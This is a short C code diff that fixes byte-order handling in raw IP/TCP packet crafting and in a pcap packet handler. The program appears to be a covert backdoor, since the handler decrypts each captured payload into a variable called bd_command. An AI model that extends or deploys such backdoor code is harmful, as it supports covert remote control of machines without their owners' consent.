@@ -284,8 +284,8 @@ int send_datagram(struct addr_info *user_addr, char *data, int data_len){
     iph->ihl = 5;
     iph->version = 4;
     iph->tos = 0;
-    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len;
-    iph->id = htonl(DEFAULT_IP_ID);
+    iph->tot_len = htons((short)(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len));
+    iph->id = htons(DEFAULT_IP_ID);
     iph->frag_off = 0;
     iph->ttl = DEFAULT_TTL;
     iph->protocol = IPPROTO_TCP;
@@ -372,7 +372,7 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     
     /* Decrypt remaining packet data */
     
-    int payload_len = packet_info.ip->ip_len - sizeof(struct iphdr) - sizeof(struct tcphdr);
+    short payload_len = ntohs(packet_info.ip->ip_len) - sizeof(struct iphdr) - sizeof(struct tcphdr);
     printf("payload_len: %d\n",payload_len);
     char *bd_command;
     bd_command = bd_decrypt((char *)packet_info.payload, payload_len);
